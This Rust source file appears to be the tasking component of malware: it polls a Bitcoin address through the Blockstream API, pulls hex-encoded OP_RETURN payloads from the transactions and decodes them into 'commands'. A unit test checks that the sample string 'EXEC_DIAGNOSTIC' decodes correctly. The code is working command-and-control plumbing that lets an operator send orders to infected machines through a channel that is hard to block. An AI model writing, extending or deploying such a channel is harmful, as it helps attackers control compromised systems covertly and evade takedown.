use serde::Deserialize;

#[derive(Deserialize, Debug)]
struct Transaction {
    #[allow(dead_code)]
    txid: String,
    vout: Vec<TxOut>,
}

#[derive(Deserialize, Debug)]
struct TxOut {
    scriptpubkey_type: Option<String>,
    scriptpubkey_asm: Option<String>,
}

/// Polls the decentralized address and checks for OP_RETURN instruction payloads
pub fn poll_decentralized_tasks(address: &str) -> Result<Option<String>, Box<dyn std::error::Error>> {
    println!("[*] Polling decentralized command vector...");
    
    // Fallback to live blockstream API, but allow local override for testing
    let base_url = std::env::var("BLOCKSTREAM_API_BASE")
        .unwrap_or_else(|_| "https://blockstream.info/api".to_string());
    
    let url = format!("{}/address/{}/txs", base_url, address);
    let resp = reqwest::blocking::get(&url)?;

    if resp.status().is_success() {
        let txs: Vec<Transaction> = resp.json()?;
        
        for tx in txs {
            for vout in tx.vout {
                if let Some(ref script_type) = vout.scriptpubkey_type {
                    if script_type == "op_return" {
                        // Assuming vout contains the hex-encoded payload or assembly string
                        // e.g., extracting from scriptpubkey_asm or a custom field
                        if let Some(ref hex_payload) = vout.scriptpubkey_asm {
                            // Split OP_RETURN prefix if present, e.g., "OP_RETURN 455845435f44494147"
                            let parts: Vec<&str> = hex_payload.split_whitespace().collect();
                            let raw_hex = if parts.len() > 1 { parts[1] } else { hex_payload };

                            if let Ok(bytes) = hex::decode(raw_hex) {
                                if let Ok(command) = String::from_utf8(bytes) {
                                    return Ok(Some(command));
                                }
                            }
                        }
                    }
                }
            }
        }
        Ok(None)
    } else {
        println!("[!] Warning: Command vector endpoint unreachable.");
        Ok(None)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_op_return_command_parsing() {
        // Hex for "EXEC_DIAGNOSTIC" is 455845435f444941474e4f53544943
        let sample_json = r#"[
            {
                "txid": "mock_txid_12345",
                "vout": [
                    {
                        "scriptpubkey_type": "op_return",
                        "scriptpubkey_asm": "OP_RETURN 455845435f444941474e4f53544943"
                    }
                ]
            }
        ]"#;

        let txs: Vec<Transaction> = serde_json::from_str(sample_json).unwrap();
        
        let mut parsed_command = None;
        for tx in txs {
            for vout in tx.vout {
                if vout.scriptpubkey_type.as_deref() == Some("op_return") {
                    if let Some(ref asm) = vout.scriptpubkey_asm {
                        let parts: Vec<&str> = asm.split_whitespace().collect();
                        if parts.len() > 1 {
                            if let Ok(bytes) = hex::decode(parts[1]) {
                                if let Ok(cmd) = String::from_utf8(bytes) {
                                    parsed_command = Some(cmd);
                                }
                            }
                        }
                    }
                }
            }
        }

        assert_eq!(parsed_command, Some("EXEC_DIAGNOSTIC".to_string()));
    }
}